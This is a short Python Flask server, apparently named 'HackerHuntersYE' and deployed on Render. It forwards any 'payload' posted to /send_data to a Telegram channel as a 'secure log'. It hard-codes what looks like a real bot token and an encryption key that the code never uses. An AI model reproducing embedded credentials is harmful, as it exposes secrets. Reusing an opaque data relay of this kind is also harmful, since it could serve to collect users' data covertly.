import os
from flask import Flask, request, jsonify
import telebot
from cryptography.fernet import Fernet

# 1. تعريف كائن الـ app (هذا هو السطر الذي يبحث عنه Render)
app = Flask(__name__)

# 2. إعدادات البوت والبيانات
TOKEN = "8507105445:AAGf3Io2nV0ENgpN2mBR9SZUOP40MTUD_Ww"
CHANNEL_ID = -1003677186780
# تأكد أن هذا المفتاح هو نفسه المستخدم في التطبيق (32 حرفاً)
KEY = b'uV9_7p_Z2p6j-S_W_H4cK3r_HUnT3r_YE_S3cr3t_K3y=' 

bot = telebot.TeleBot(TOKEN)
cipher = Fernet(KEY)

@app.route('/')
def index():
    return "HackerHuntersYE Server is Online!"

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        # استقبال البيانات من التطبيق
        content = request.json.get('payload')
        if not content:
            return jsonify({"error": "No payload found"}), 400
            
        # إرسال البيانات إلى القناة
        bot.send_message(CHANNEL_ID, f"--- NEW SECURE LOG ---\n{content}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# 3. تشغيل التطبيق
if __name__ == "__main__":
    # ريندر يمرر المنفذ تلقائياً، ولكن للاحتياط:
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
